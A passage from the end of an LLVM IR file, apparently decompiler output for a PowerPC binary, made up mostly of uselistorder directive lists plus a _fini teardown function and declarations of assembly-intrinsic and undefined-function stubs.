572, 631, 632, 458, 18, 594, 17, 595, 243, 244, 128, 129, 112, 130, 131, 132, 245, 251, 252, 253, 246, 247, 33, 248, 32, 249, 250, 144, 145, 146, 19, 254, 255, 256, 257, 258, 259, 94, 605, 606, 607, 608, 611, 612, 613, 614, 615, 616, 617, 122, 618, 619, 609, 610, 95, 96, 103, 260, 261, 52, 147, 148, 104, 573, 574, 2, 575, 576, 577, 262, 263, 264, 265, 266, 267, 268, 269, 569, 570, 105, 578, 579, 20, 99, 123, 108, 620, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 100, 113, 92, 149, 114, 115, 283, 101, 286, 287, 288, 117, 289, 290, 291, 292, 293, 294, 295, 459, 296, 627, 628, 623, 298, 102, 299, 300, 50, 460, 461, 462, 463, 21, 34, 308, 309, 310, 35, 311, 36, 312, 313, 314, 315, 316, 317, 318, 319, 37, 320, 321, 322, 41, 40, 323, 324, 325, 326, 39, 38, 327, 328, 336, 337, 338, 339, 46, 340, 45, 341, 342, 343, 44, 344, 345, 43, 346, 42, 351, 359, 360, 361, 362, 363, 364, 365, 366, 373, 374, 375, 47, 376, 377, 378, 379, 380, 381, 427, 428, 429, 3, 430, 431, 450, 451, 452, 454, 453, 456, 457, 464, 465, 469, 470, 106, 107, 120 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268532344, i32* @lr, align 4
  %v0_10017a74 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_10017a74

; uselistorder directives
  uselistorder i32 0, { 1432, 1433, 94, 1436, 200, 1434, 1435, 138, 1437, 1438, 1439, 1442, 1440, 0, 1441, 1443, 201, 1075, 1076, 202, 519, 520, 975, 1077, 1074, 203, 1, 172, 1444, 365, 1802, 1085, 2, 1803, 1460, 1447, 1450, 1451, 1452, 521, 1453, 1454, 1456, 1455, 1457, 1458, 1459, 1461, 1462, 1463, 1464, 1445, 1446, 1448, 1449, 204, 1465, 1467, 1468, 1466, 1469, 1470, 1471, 1472, 434, 875, 1473, 435, 876, 877, 205, 206, 976, 977, 978, 979, 980, 981, 982, 983, 984, 207, 366, 986, 985, 208, 987, 988, 210, 209, 989, 522, 990, 991, 992, 212, 211, 993, 994, 441, 523, 995, 213, 1474, 1475, 1476, 1477, 1482, 1478, 142, 1483, 1484, 1479, 1480, 1481, 139, 140, 141, 1485, 524, 95, 96, 97, 429, 1487, 214, 1486, 525, 1488, 1489, 1490, 1491, 215, 1038, 527, 1039, 216, 526, 1040, 1041, 1042, 1043, 98, 996, 137, 1086, 501, 502, 528, 1078, 1079, 503, 504, 1804, 1896, 529, 1897, 1900, 1899, 367, 442, 1805, 505, 506, 507, 508, 878, 1044, 1045, 1046, 1055, 217, 1807, 530, 1820, 1821, 1822, 218, 924, 3, 197, 1087, 1088, 1089, 1090, 1091, 178, 99, 1492, 368, 1493, 1494, 1495, 1496, 1313, 369, 219, 997, 998, 999, 1000, 220, 221, 1001, 879, 1002, 1003, 1004, 1005, 531, 1006, 1007, 1871, 1656, 1799, 1800, 1801, 1823, 1824, 1580, 1581, 1582, 1583, 1584, 1585, 1586, 1827, 79, 1828, 223, 222, 1829, 1830, 1831, 224, 1587, 1588, 1589, 1591, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1839, 80, 4, 1008, 1009, 1010, 1011, 1012, 1902, 1015, 1013, 1014, 143, 5, 1872, 1873, 532, 1925, 146, 533, 443, 1929, 534, 1930, 1931, 144, 145, 1932, 6, 1907, 1903, 1904, 1905, 1906, 370, 1908, 1909, 1910, 1911, 1912, 535, 1913, 1914, 1135, 1136, 1137, 147, 148, 1138, 536, 537, 1504, 1497, 538, 149, 1498, 1499, 1501, 100, 1502, 1503, 1505, 1506, 1507, 1508, 1509, 1510, 444, 430, 431, 540, 1511, 1512, 1513, 1515, 371, 1518, 541, 445, 1521, 1522, 1523, 1524, 539, 446, 1517, 1514, 1516, 1519, 1525, 436, 1526, 1527, 1528, 7, 1529, 1530, 1531, 226, 1532, 225, 1533, 227, 925, 228, 926, 229, 927, 230, 928, 231, 929, 232, 930, 233, 931, 234, 932, 235, 1808, 542, 1809, 1815, 1816, 1817, 880, 1818, 881, 236, 1047, 543, 1048, 1049, 1050, 882, 1051, 1052, 1053, 1054, 237, 1105, 1106, 1107, 238, 1810, 1811, 1812, 883, 173, 1813, 1814, 1016, 884, 1017, 885, 886, 239, 1018, 1019, 240, 1020, 1021, 1022, 1023, 887, 241, 242, 243, 1024, 1025, 1026, 544, 545, 1027, 1028, 1029, 244, 245, 246, 1030, 1031, 1032, 546, 547, 1033, 1034, 1035, 1875, 1876, 888, 1036, 1037, 889, 433, 1874, 1056, 1057, 247, 1058, 1059, 1060, 548, 549, 1061, 101, 372, 179, 1062, 1063, 1064, 1065, 1066, 8, 550, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 551, 248, 1080, 1081, 1082, 1936, 373, 249, 552, 1933, 1934, 1083, 131, 150, 1084, 1092, 151, 356, 374, 1093, 1094, 250, 1095, 102, 103, 375, 1096, 1097, 1098, 1099, 1100, 252, 1935, 251, 376, 253, 1101, 1102, 1103, 1104, 254, 1819, 9, 447, 1108, 1109, 10, 1110, 1111, 1112, 11, 1877, 1878, 1879, 1880, 1881, 553, 255, 256, 1113, 1114, 12, 1115, 1116, 1117, 198, 1882, 554, 1883, 448, 1885, 933, 934, 935, 936, 937, 938, 449, 437, 939, 940, 941, 942, 943, 944, 947, 946, 948, 949, 950, 951, 450, 952, 953, 954, 555, 955, 945, 956, 957, 958, 959, 960, 1886, 1887, 1888, 451, 1889, 452, 1890, 1891, 1892, 1893, 1894, 1895, 13, 258, 257, 556, 1118, 1119, 1120, 1121, 1122, 1125, 1126, 1123, 1124, 1127, 557, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1937, 1938, 14, 259, 453, 1314, 1315, 1316, 15, 1840, 1841, 378, 1843, 1842, 132, 16, 1844, 377, 17, 1845, 380, 1846, 133, 18, 1847, 379, 1534, 1535, 152, 1536, 1537, 1538, 1539, 1540, 1592, 1593, 1594, 558, 1595, 1596, 1597, 1657, 1658, 1659, 1660, 1661, 559, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 260, 261, 1675, 1676, 1677, 1678, 1679, 1680, 1681, 1682, 1683, 104, 1684, 560, 174, 1685, 1686, 1687, 1688, 1689, 262, 1690, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 1699, 263, 1700, 1701, 1702, 509, 510, 1703, 1704, 1705, 81, 19, 1706, 1707, 1708, 1848, 1849, 1850, 1851, 1852, 1853, 1854, 1855, 1856, 1857, 1858, 1859, 1860, 1861, 1862, 180, 1971, 1972, 1973, 1975, 1974, 20, 381, 21, 1333, 1711, 1710, 382, 1709, 181, 1712, 1713, 1714, 264, 1715, 1976, 1977, 454, 1978, 1979, 1980, 1981, 1334, 1335, 1915, 1901, 455, 1982, 1939, 1955, 1956, 561, 1970, 562, 563, 564, 565, 2097, 2098, 566, 2104, 2124, 383, 2125, 567, 568, 2116, 22, 1983, 1984, 265, 1365, 1366, 569, 456, 570, 1367, 1368, 155, 156, 1369, 1370, 1371, 571, 1372, 1373, 1374, 153, 154, 1375, 1376, 1336, 1337, 1338, 1339, 1340, 1341, 266, 267, 1985, 1986, 572, 2069, 1405, 1406, 1407, 1408, 1409, 268, 1410, 1411, 1412, 511, 1413, 573, 1414, 575, 574, 457, 576, 577, 578, 1139, 579, 1140, 580, 1141, 1142, 1143, 269, 1144, 270, 1381, 1382, 384, 182, 199, 1383, 1384, 23, 1640, 1145, 1146, 271, 1147, 1148, 1149, 2002, 2004, 105, 2005, 157, 2006, 2003, 2000, 2001, 24, 1942, 1940, 1941, 385, 1943, 1944, 2007, 2008, 581, 2025, 458, 1945, 1953, 1954, 272, 1946, 1947, 1948, 1949, 1950, 1951, 1952, 25, 26, 890, 27, 273, 1303, 460, 459, 1304, 28, 29, 582, 1916, 1917, 512, 513, 583, 1541, 1542, 386, 1543, 1544, 1545, 1546, 1552, 1553, 1554, 1555, 274, 1556, 1557, 1558, 1420, 1421, 1422, 275, 1423, 438, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 2105, 2106, 2107, 2108, 2109, 2110, 2111, 2112, 584, 2113, 30, 276, 1500, 277, 278, 1716, 1717, 82, 83, 461, 84, 1718, 387, 1719, 1720, 388, 585, 1721, 1547, 1548, 1549, 1550, 1551, 1559, 280, 279, 1560, 1863, 1864, 389, 2126, 2127, 2128, 2129, 2130, 2131, 2132, 2133, 2117, 2118, 2119, 158, 2120, 2121, 2122, 2123, 281, 1865, 1866, 1867, 1868, 1869, 1870, 1561, 1562, 1563, 1564, 1565, 1566, 282, 1598, 1599, 1600, 1601, 1602, 1603, 1608, 1604, 1605, 1606, 1607, 390, 1609, 1610, 1611, 31, 159, 1612, 1567, 1613, 1342, 1343, 1722, 1723, 183, 1724, 1725, 1726, 1727, 1728, 439, 1729, 1730, 1731, 283, 1732, 1733, 1734, 1735, 1736, 284, 1737, 1738, 1739, 1740, 1741, 1742, 1743, 285, 1744, 1745, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 106, 357, 358, 391, 1754, 1755, 286, 1756, 586, 1757, 1758, 587, 1761, 291, 287, 1759, 1760, 589, 1762, 1763, 1764, 1766, 292, 1767, 32, 33, 293, 294, 288, 289, 1768, 1769, 290, 1770, 1771, 1772, 1773, 1774, 1775, 1776, 1777, 1778, 588, 1779, 1780, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 891, 1789, 1790, 85, 1792, 160, 184, 295, 590, 1795, 514, 1796, 1791, 1793, 1794, 1797, 1798, 296, 961, 962, 175, 134, 171, 1765, 392, 1987, 1989, 1988, 394, 297, 1999, 1990, 393, 462, 1614, 1615, 1616, 298, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 591, 1626, 1627, 1628, 1629, 1630, 1631, 463, 464, 299, 466, 1344, 395, 1345, 1346, 77, 1347, 1349, 1350, 465, 1351, 592, 1353, 1354, 1355, 440, 1649, 1650, 593, 1632, 1633, 1634, 1635, 1636, 1637, 1638, 2026, 594, 595, 1352, 596, 597, 1415, 2070, 2071, 2072, 1283, 1576, 2009, 1270, 1276, 1277, 1267, 1271, 1590, 1520, 1348, 1150, 300, 1151, 2099, 301, 2100, 2010, 1225, 1152, 1153, 1195, 1196, 598, 1197, 86, 1825, 1826, 2073, 1884, 1284, 1317, 1806, 1285, 2103, 1154, 1641, 1898, 2027, 2101, 2102, 1286, 599, 1287, 1288, 76, 75, 2114, 2115, 600, 1155, 468, 601, 467, 602, 1156, 472, 603, 470, 469, 471, 2074, 2075, 396, 2076, 2077, 2078, 2079, 2080, 2081, 2082, 2083, 2084, 34, 604, 2028, 2029, 2030, 2031, 2032, 2033, 2034, 2035, 135, 2038, 2036, 2037, 107, 397, 2039, 2040, 2041, 2042, 303, 1201, 1202, 1203, 185, 1204, 1205, 302, 1207, 1206, 1208, 605, 1209, 1210, 1211, 186, 2085, 2087, 2086, 2088, 2011, 2019, 2020, 606, 2017, 136, 473, 2016, 304, 474, 2018, 305, 306, 1157, 1158, 1159, 607, 2043, 2044, 2048, 2049, 309, 2050, 108, 608, 2045, 2046, 2047, 308, 307, 398, 35, 610, 1160, 609, 1161, 1162, 1165, 1163, 1164, 311, 310, 399, 400, 1166, 1167, 1168, 1169, 36, 612, 1170, 312, 1171, 611, 1172, 1173, 963, 964, 314, 313, 1174, 1175, 315, 1926, 316, 1927, 1928, 317, 1918, 1919, 1920, 1921, 318, 1922, 1923, 1924, 965, 966, 319, 1176, 1177, 1178, 320, 1179, 614, 613, 1180, 1183, 615, 1184, 1185, 37, 616, 617, 1186, 1187, 323, 322, 1189, 321, 1190, 1191, 1192, 1193, 324, 1194, 38, 1188, 39, 325, 1181, 1182, 618, 161, 619, 1198, 109, 110, 111, 1200, 1199, 162, 1212, 1213, 621, 1214, 1215, 620, 1216, 1217, 1218, 1219, 1220, 1991, 1994, 1995, 1998, 622, 40, 1959, 623, 1961, 1962, 624, 1968, 1969, 2089, 626, 2090, 625, 2091, 2092, 2093, 2094, 326, 628, 2021, 2022, 627, 2023, 2024, 327, 629, 41, 892, 42, 630, 43, 328, 44, 45, 329, 1221, 1222, 1223, 46, 1643, 631, 1644, 47, 1993, 1992, 163, 48, 187, 1997, 1996, 164, 1224, 896, 633, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 475, 909, 910, 911, 632, 476, 912, 477, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 634, 1234, 1235, 635, 1226, 636, 1237, 637, 1238, 1239, 1233, 638, 1227, 165, 331, 330, 1228, 1229, 1230, 402, 1231, 401, 639, 1232, 967, 968, 969, 640, 1236, 641, 1240, 1645, 403, 332, 1241, 1242, 1243, 1244, 1245, 893, 642, 333, 2051, 2052, 643, 644, 2053, 2054, 2056, 2057, 645, 2058, 2059, 2060, 2061, 2064, 2055, 49, 646, 1246, 1247, 334, 1963, 647, 648, 1964, 1965, 1967, 335, 1248, 650, 404, 649, 1249, 1252, 1253, 651, 1254, 1255, 1256, 50, 1957, 652, 405, 653, 1958, 1966, 51, 894, 52, 654, 53, 54, 78, 895, 55, 655, 1642, 336, 1250, 1251, 656, 166, 56, 1960, 2095, 657, 2096, 2065, 2066, 2067, 2068, 2062, 2063, 337, 1257, 1258, 1259, 1260, 515, 516, 517, 1261, 1262, 1263, 1264, 1265, 1266, 338, 2012, 2013, 2014, 2015, 339, 57, 340, 58, 1268, 59, 341, 60, 61, 62, 63, 342, 343, 87, 88, 1269, 64, 344, 65, 345, 66, 346, 67, 347, 348, 1272, 349, 1273, 1274, 1275, 1278, 1279, 1280, 970, 971, 658, 972, 1281, 478, 1282, 659, 350, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1301, 660, 661, 662, 663, 664, 665, 666, 1296, 406, 1297, 1298, 1299, 1300, 479, 667, 668, 669, 670, 671, 672, 673, 675, 676, 674, 1302, 677, 480, 678, 1305, 679, 1306, 1307, 93, 680, 351, 1308, 68, 69, 1309, 848, 849, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 352, 708, 1312, 709, 710, 1646, 353, 1647, 407, 1310, 1311, 712, 711, 1318, 1319, 167, 168, 71, 409, 70, 410, 408, 717, 1320, 89, 1321, 112, 359, 715, 716, 113, 360, 482, 481, 714, 411, 718, 719, 713, 1322, 721, 722, 488, 487, 483, 484, 485, 486, 1323, 720, 169, 723, 724, 1324, 1325, 1326, 725, 1327, 1328, 1329, 188, 114, 72, 189, 1330, 190, 115, 417, 416, 415, 1331, 1332, 191, 116, 414, 413, 412, 1356, 192, 117, 424, 193, 118, 119, 423, 422, 361, 1357, 726, 421, 91, 92, 727, 1358, 1359, 1360, 1361, 194, 120, 420, 728, 1362, 195, 121, 419, 196, 122, 418, 1364, 425, 1363, 362, 1377, 1378, 489, 729, 490, 1379, 730, 1380, 731, 491, 732, 492, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 733, 1392, 734, 1393, 735, 493, 736, 495, 1394, 494, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 737, 1403, 354, 426, 1404, 738, 496, 739, 498, 497, 1416, 1417, 1418, 740, 1419, 742, 123, 363, 364, 124, 73, 741, 1431, 743, 1568, 428, 744, 1569, 1570, 427, 745, 1571, 746, 1572, 126, 125, 74, 1573, 747, 1574, 176, 177, 127, 1575, 355, 749, 1577, 90, 499, 500, 748, 170, 1578, 1579, 750, 751, 128, 129, 1639, 752, 432, 130, 1648, 1651, 1652, 518, 1653, 1654, 2134, 2135, 2136, 1655, 973, 974, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 2137, 2138, 2139, 2140, 2141, 2142, 2143, 2144, 2145, 2146, 2147, 2148, 2149, 2150, 2151, 2152, 2153, 2154, 2155, 2156, 2157, 2158, 2159, 2160, 2161, 2162, 2163, 2164, 2165 }
  uselistorder i32* @lr, { 128, 695, 696, 697, 698, 699, 188, 194, 195, 189, 13, 14, 190, 193, 129, 130, 131, 132, 133, 134, 135, 191, 192, 136, 137, 31, 32, 700, 996, 701, 204, 702, 706, 703, 704, 705, 710, 711, 707, 708, 709, 712, 713, 714, 715, 716, 138, 139, 140, 143, 141, 142, 717, 720, 718, 1, 719, 0, 721, 724, 725, 722, 723, 151, 152, 153, 154, 155, 205, 196, 197, 198, 1075, 1083, 1076, 1077, 1078, 1079, 1080, 1082, 998, 999, 1000, 1001, 156, 157, 158, 164, 165, 1002, 1012, 1013, 1014, 33, 726, 727, 728, 729, 730, 731, 504, 1015, 1043, 1044, 956, 993, 994, 995, 1017, 1018, 853, 854, 855, 856, 1019, 1020, 1021, 1022, 1023, 1024, 144, 1086, 1087, 1098, 1099, 145, 1106, 1107, 1108, 1114, 1115, 1116, 1117, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 248, 732, 733, 734, 740, 735, 736, 739, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 34, 35, 1003, 1004, 1005, 1006, 1007, 1008, 146, 159, 160, 161, 162, 163, 218, 147, 148, 149, 150, 166, 167, 168, 169, 170, 171, 173, 172, 174, 175, 176, 177, 178, 182, 179, 180, 181, 184, 183, 9, 185, 186, 187, 199, 200, 201, 202, 1124, 1123, 10, 1118, 1119, 1120, 1122, 203, 206, 207, 208, 209, 210, 211, 212, 1121, 213, 214, 215, 216, 217, 1009, 1010, 1011, 219, 220, 221, 222, 223, 224, 225, 226, 227, 1045, 1046, 1047, 1048, 1049, 1050, 228, 229, 230, 231, 232, 233, 1051, 1052, 1053, 1054, 1055, 1056, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 234, 1057, 1058, 1059, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1071, 1072, 1073, 1074, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 1125, 1164, 505, 506, 507, 508, 1025, 1026, 1027, 1165, 1028, 1029, 857, 858, 859, 860, 861, 957, 958, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1166, 1167, 552, 553, 554, 959, 960, 1168, 1169, 555, 1084, 1085, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 245, 1070, 246, 247, 1137, 1138, 1163, 1258, 1259, 1263, 1264, 1265, 1266, 1267, 1283, 1285, 1287, 1280, 1281, 1282, 1260, 1262, 600, 601, 602, 603, 604, 605, 606, 556, 1179, 1180, 1187, 1188, 1243, 1257, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 637, 270, 638, 639, 640, 267, 268, 269, 271, 272, 273, 915, 916, 1189, 1191, 1190, 1192, 1193, 1194, 1210, 1211, 1212, 1213, 1214, 1126, 1136, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 487, 361, 488, 1100, 1101, 1102, 1103, 1081, 1060, 676, 274, 765, 275, 276, 832, 833, 786, 997, 834, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 802, 803, 804, 805, 806, 1268, 1269, 1270, 1271, 1272, 1275, 1276, 1277, 737, 738, 961, 962, 963, 964, 800, 801, 1286, 1284, 1040, 1041, 1042, 807, 808, 809, 810, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 811, 812, 813, 814, 877, 878, 879, 557, 558, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 48, 49, 979, 1181, 1182, 1183, 1184, 1185, 1186, 1278, 1279, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 579, 580, 581, 582, 583, 940, 941, 584, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 947, 277, 342, 1016, 446, 1261, 489, 1273, 1274, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 1246, 1247, 1215, 1216, 347, 348, 349, 350, 351, 352, 353, 1252, 1251, 1195, 1196, 1204, 1206, 1207, 1245, 1203, 1201, 1202, 1205, 1217, 1218, 1219, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 50, 306, 307, 308, 309, 310, 1113, 1109, 1110, 1111, 1112, 1104, 1105, 51, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 52, 53, 330, 332, 333, 11, 334, 337, 338, 339, 331, 340, 341, 335, 336, 343, 344, 345, 346, 354, 355, 356, 357, 54, 55, 56, 1142, 1143, 1144, 1145, 1146, 1161, 1162, 1253, 1254, 1255, 1256, 1208, 1209, 358, 359, 360, 362, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 364, 375, 363, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 374, 365, 367, 2, 366, 368, 369, 370, 371, 372, 373, 57, 58, 59, 60, 61, 62, 63, 64, 376, 387, 429, 430, 388, 3, 389, 390, 391, 392, 393, 394, 395, 1220, 4, 1221, 1222, 1223, 1224, 1225, 1226, 1229, 1230, 1231, 1232, 1233, 1235, 1236, 5, 1237, 1238, 1239, 1240, 1242, 1234, 1227, 1228, 396, 397, 398, 65, 66, 1147, 1149, 1150, 1151, 1153, 6, 1154, 1155, 1156, 1157, 1160, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 1152, 1139, 1140, 1141, 1148, 1158, 1159, 414, 1241, 415, 416, 417, 418, 419, 420, 421, 1197, 422, 423, 424, 425, 426, 427, 428, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 67, 68, 69, 70, 442, 443, 444, 445, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 477, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 478, 479, 480, 481, 482, 486, 919, 920, 921, 922, 483, 484, 485, 7, 1248, 1249, 1250, 1244, 490, 491, 492, 493, 494, 495, 496, 835, 836, 837, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 1198, 1199, 1200, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 576, 577, 578, 942, 943, 944, 838, 839, 840, 815, 816, 817, 841, 842, 843, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 677, 678, 679, 497, 498, 499, 501, 502, 503, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 500, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 534, 529, 530, 531, 532, 533, 8, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 585, 586, 587, 588, 592, 589, 590, 591, 12, 593, 594, 595, 596, 597, 598, 599, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 844, 845, 846, 847, 848, 849, 850, 851, 852, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 917, 918, 937, 938, 939, 945, 946, 948, 949, 950, 951, 952, 953, 954, 955 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #0

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %3 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %2 @__asm_crandc(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i8** @__decompiler_undefined_function_5() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
